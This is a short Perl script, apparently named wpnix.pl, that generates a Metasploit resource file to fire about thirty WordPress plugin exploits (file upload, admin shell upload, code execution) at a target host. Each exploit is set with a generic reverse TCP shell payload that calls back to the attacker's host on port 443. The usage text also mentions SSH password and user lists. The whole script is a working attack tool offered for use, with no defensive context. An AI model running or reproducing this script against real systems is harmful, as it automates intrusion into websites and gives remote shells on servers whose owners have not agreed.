if (@ARGV < 2)
	{
	    print "Usage: ./wpnix.pl source target > wpnix.rc\n";
	    print "passwords in /root/ssh_pass\n";
	    print "users in /root/ssh_users\n";
	} else {
	$source=$ARGV[0];
	$source_port="443";
	$target=$ARGV[1];
	@exploits =("use exploit/unix/webapp/php_wordpress_foxypress","use exploit/unix/webapp/php_wordpress_infusionsoft","use exploit/unix/webapp/php_wordpress_lastpost","use exploit/unix/webapp/php_wordpress_optimizepress","use exploit/unix/webapp/php_wordpress_total_cache","use exploit/unix/webapp/php_xmlrpc_eval","use exploit/unix/webapp/wp_admin_shell_upload","use exploit/unix/webapp/wp_advanced_custom_fields_exec","use exploit/unix/webapp/wp_asset_manager_upload_exec","use exploit/unix/webapp/wp_creativecontactform_file_upload","use exploit/unix/webapp/wp_downloadmanager_upload","use exploit/unix/webapp/wp_easycart_unrestricted_file_upload","use exploit/unix/webapp/wp_foxypress_upload","use exploit/unix/webapp/wp_google_document_embedder_exec","use exploit/unix/webapp/wp_holding_pattern_file_upload","use exploit/unix/webapp/wp_infusionsoft_upload","use exploit/unix/webapp/wp_lastpost_exec","use exploit/unix/webapp/wp_nmediawebsite_file_upload","use exploit/unix/webapp/wp_optimizepress_upload","use exploit/unix/webapp/wp_photo_gallery_unrestricted_file_upload","use exploit/unix/webapp/wp_pixabay_images_upload","use exploit/unix/webapp/wp_platform_exec","use exploit/unix/webapp/wp_property_upload_exec","use exploit/unix/webapp/wp_reflexgallery_file_upload","use exploit/unix/webapp/wp_slideshowgallery_upload","use exploit/unix/webapp/wp_symposium_shell_upload","use exploit/unix/webapp/wp_total_cache_exec","use exploit/unix/webapp/wp_worktheflow_upload","use exploit/unix/webapp/wp_wptouch_file_upload","use exploit/unix/webapp/wp_wysija_newsletters_upload");
	
foreach $exploit(@exploits) {
print $exploit."\n";
print "set PAYLOAD generic/shell_reverse_tcp"."\n";
print "set LHOST ".$source."\n";
print "set LPORT ".$source_port."\n";
print "set RHOSTS ".$target."\n";
print "set RPORT 80"."\n";
print "set TARGETURI /wp/"."\n";
print "spool off"."\n";
print "run"."\n"; 
print "\n";}
	
	
	}

